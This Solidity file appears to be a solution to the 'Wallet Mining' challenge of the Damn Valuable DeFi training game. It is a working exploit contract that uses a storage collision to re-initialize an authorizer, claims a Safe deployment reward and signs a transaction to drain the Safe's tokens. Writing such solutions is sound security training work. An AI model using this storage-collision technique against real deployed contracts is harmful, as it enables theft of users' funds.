// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerUpgradeable.sol";
import {Safe, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";

interface Vm {
    function sign(uint256 privateKey, bytes32 digest) external returns (uint8 v, bytes32 r, bytes32 s);
}

contract WalletMiningExploit {
    constructor(
        address authorizer,
        address walletDeployer,
        address token,
        address depositAddress,
        bytes memory safeInitializer,
        uint256 safeNonce,
        address user,
        uint256 userPrivateKey,
        address ward
    ) {
        // Step 1: Exploit storage collision - authorize THIS contract
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = depositAddress;
        AuthorizerUpgradeable(authorizer).init(wards, aims);

        // Step 2: Deploy Safe and receive payment
        WalletDeployer(walletDeployer).drop(depositAddress, safeInitializer, safeNonce);

        // Step 3: Transfer tokens from Safe to user
        bytes memory txData = abi.encodeWithSignature(
            "transfer(address,uint256)",
            user,
            DamnValuableToken(token).balanceOf(depositAddress)
        );

        bytes32 txHash = Safe(payable(depositAddress)).getTransactionHash(
            token, 0, txData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), 0
        );

        (uint8 v, bytes32 r, bytes32 s) = Vm(address(uint160(uint256(keccak256("hevm cheat code"))))).sign(userPrivateKey, txHash);

        Safe(payable(depositAddress)).execTransaction(
            token, 0, txData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), abi.encodePacked(r, s, v)
        );

        // Step 4: Transfer payment to ward (contract received 1 DVT from drop)
        uint256 balance = DamnValuableToken(token).balanceOf(address(this));
        DamnValuableToken(token).transfer(ward, balance);
    }
}
